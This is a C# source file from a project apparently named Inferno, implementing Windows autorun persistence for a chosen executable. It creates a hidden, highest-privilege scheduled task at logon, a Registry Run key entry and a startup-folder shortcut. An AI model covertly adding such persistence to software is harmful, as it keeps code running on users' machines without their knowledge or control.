using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using IWshRuntimeLibrary;

namespace Inferno
{
	internal class autorun
	{

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		// Get autorun full Path and Name
		protected static string[] getAutorunData(string path)
		{
			// Check if file exists
			if (!System.IO.File.Exists(path))
			{
				output.error = true;
				core.Exit("File " + path + " not found", output, 1);
			}
			// Return
			string[] result = new string[2]
			{
				Path.GetFullPath(path),
				Path.GetFileNameWithoutExtension(path)
			};
			return result;
		}
		//  TaskScheduler command
		protected static void TaskSchedulerCommand(string args)
		{
			if (!admin.isAdmin())
			{
				output.error = true;
				core.Exit("Access denied, administrator rights needed!", output, 2);
			}

			Process process = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "schtasks.exe";
			startInfo.Arguments = args;
			process.StartInfo = startInfo;
			process.Start();
			process.WaitForExit();
		}
		// Registry autorun key
		protected static RegistryKey autorunKey()
		{
			if (!admin.isAdmin())
			{
				output.error = true;
				core.Exit("Access denied, administrator rights needed!", output, 2);
			}
			RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			return key;
		}

		// Install TaskScheduler
		public static void installTaskScheduler(string path)
		{
			string[] data = getAutorunData(path);
			TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + data[1] + "\" /tr \"" + data[0] + "\"");
			core.Exit("Installed " + data[1] + " to autorun. Method with taskscheduler", output);
		}
		// Uninstall TaskScheduler
		public static void uninstallTaskScheduler(string path)
		{
			string[] data = getAutorunData(path);
			TaskSchedulerCommand("/delete /f /tn \"" + data[1] + "\"");
			core.Exit("Uninstalled " + data[1] + " from autorun. Method with taskscheduler", output);
		}
		// Install Registry
		public static void installRegistry(string path)
		{
			string[] data = getAutorunData(path);
			autorunKey().SetValue(data[1], data[0]);
			core.Exit("Installed " + data[1] + " to autorun. Method with registry", output);
		}
		// Uninstall Registry
		public static void uninstallRegistry(string path)
		{
			string[] data = getAutorunData(path);
			try
			{
				autorunKey().DeleteValue(data[1]);
			} catch { }
			core.Exit("Uninstalled " + data[1] + " from autorun. Method with registry", output);
		}
		// Install shell:startup
		public static void installShellStartup(string path)
		{
			// Create shortcut
			string[] data = getAutorunData(path);
			string shellStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			WshShell wsh = new WshShell();
			IWshShortcut shortcut = wsh.CreateShortcut(shellStartup + data[1] + ".lnk") as IWshShortcut;
			shortcut.Arguments = "";
			shortcut.TargetPath = data[0];
			shortcut.WorkingDirectory = Path.GetDirectoryName(data[0]);
			shortcut.Save();
			core.Exit("Installed " + data[1] + " to autorun. Method with shell:startup directory", output);
		}
		// Uninstall shell:startup
		public static void uninstallShellStartup(string path)
		{
			// Delete shortcut
			string[] data = getAutorunData(path);
			string shellStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			System.IO.File.Delete(shellStartup + data[1] + ".lnk");
			core.Exit("Uninstalled " + data[1] + " from autorun. Method with shell:startup directory", output);
		}
	}
}
